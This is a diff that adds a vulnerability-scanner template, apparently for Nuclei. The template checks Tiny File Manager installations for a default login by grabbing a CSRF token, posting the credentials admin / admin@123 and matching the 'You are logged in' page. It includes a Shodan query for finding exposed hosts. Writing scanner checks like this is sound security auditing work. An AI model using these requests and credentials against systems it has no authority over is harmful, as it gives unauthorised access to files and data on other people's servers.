@@ -1,0 +1,69 @@
+id: tiny-filemanager-default-login
+
+info:
+  name: Tiny File Manager - Default Login
+  author: shelled
+  severity: high
+  description: Tiny File Manager contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://github.com/prasathmani/tinyfilemanager
+    - https://tinyfilemanager.github.io/docs/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:tinyfilemanager_project:tinyfilemanager:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: html:"Tiny File Manager"
+    product: tinyfilemanager
+    vendor: tinyfilemanager_project
+  tags: default-login,tiny,filemanager
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fm_usr={{user}}&fm_pwd={{pass}}&token={{token}}
+      - |
+        GET /?p= HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - admin
+      pass:
+        - admin@123
+    skip-variables-check: true
+    host-redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'admin'
+          - 'You are logged in'
+          - 'Tiny File Manager'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        regex:
+          - '([a-f0-9]{64})'
+        internal: true
+# digest: 4b0a00483046022100af376a38c51f2705290e5747d0929b2059cc630ffd9cdf3c40448eaccefe786d022100da421eba37e9f169874de5b15d25ddb654a78750f58329b905e2315d28945ec9:922c64590222798bb761d5b6d8e72950
